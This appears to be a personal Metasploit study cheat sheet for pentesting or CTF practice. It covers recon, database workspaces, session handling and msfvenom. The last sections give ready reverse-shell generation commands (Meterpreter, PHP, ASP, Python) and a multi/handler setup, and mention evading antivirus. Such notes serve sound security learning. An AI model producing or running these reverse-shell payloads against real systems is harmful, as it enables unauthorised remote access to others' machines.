Metasploit

How to use msfvemon and utalise the databases

----------------------
Metasploit Recon
----------------------

Metasploit allows for the use of nmap from within it, as well as having its own port scanning tools
Metasploit also has a UDP service identification scanner 'scanner/discovery/udp_sweep' as well as an SMB scanner 'scanner/smb/'
always remember that when doing a pentest / ctf, metasploit has a search option and can be used when stuck on ideas

----------------------
Metasploit Databases
----------------------
Metasploit databases are helpful when attacking multiple targets, it avoids confusion

to start a database: 'systemctl start postgresql' then 'msfdb init'

run 'msfconsole' and 'db_status' to check database is up

metasploit allows us to create workspaces
'workspace' - to check current workspace
'workspace -a *WORKSPACE-NAME*' - Add a workspace
'workspace -d *WORKSPACE-NAME*' - delete workspace
'workspace *WORKSPACE-NAME*' - swap between workspaces

the 'help' command can always help..

running 'db_nmap -sV -sC *IP*' (or any nmap command) stores the results in our database

we can enumerate the database data by running
'hosts' - display host data
'services' - displays port data of hosts

we can use 'hosts -r' to add the hosts to an option in metasploit

--------------------------------------------
Using Metasploit for 'low hanging fruit'
--------------------------------------------

'Low Hanging Fruit' refers to exploits that can be easily identified and exploited.
We can utalise metasploit to find vulnerabilities by searching withing metasploit for services we may have discovered previously.

For example if we find a VNC service (screen sharing program/server) we can search 'auxiliary/scanner/vnc' to look for VNC scanners.

--------------------------------------------
Using metasploit to exploit a target
--------------------------------------------
After selecting an exploit, we can see the typical options through 'show options'
but we can also see payloads to use for with 'show payloads'

Once we run an example and recieve a session from it, we can hide this by running 'Cntrl-z' or kill it with 'Cntrl-c'
If we have backgrounded sessions we can run 'sessions' to see what is currently running, we can then swap to a specific sesstion using 'sessions -i *SESSION-ID*'

--------------------------------------------
Msfvenom
--------------------------------------------
Msfvenom allows us to access all payloads in metasploit. It also allows for the creation of payloads in all types of languages (php, exe, dll, elf, etc, etc).

View payloads: 'msfvenom -l payloads'
View all types of formats: 'msfvenom --list formats'

Generate a payload: 'msfvenom -p *PAYLOAD* LHOST=*OUR_IP*'

----------------------
Encoding
----------------------

we can also encode payloads (wont really bypass antivirus. modern obfuscation techniques or methods to inject shellcode are better for that.): - 

Example: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=*OUR_IP* -f raw -e php/base64' encodes the php version of meterpreter to base64 

----------------------
More payloads and Handlers
----------------------

After generating a payload (for example a reverse php shell), we will require something to pick up the connection coming from the host the payload is executed on. Which is where handlers come in.

lets generate an example shell. 
msfvenom -p php/reverse_php LHOST=10.11.93.140 LPORT=1337 -f raw > php_shell.php

some other examples:


Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py


ALWAYS CHECK THE SHELL IS CORRECT. THIS PHP SHELL HAD TO BE MODIFIED TO WORK!!!!



Now lets use the handler.. (back to msfconsole)

'use /exploit/multi/handler'

set the payload in the handler, for example 'set payload php/reverse_php'

set up the options, lhost=*ip* and lport=*port*

and run..

this will now be waiting for a connection from the target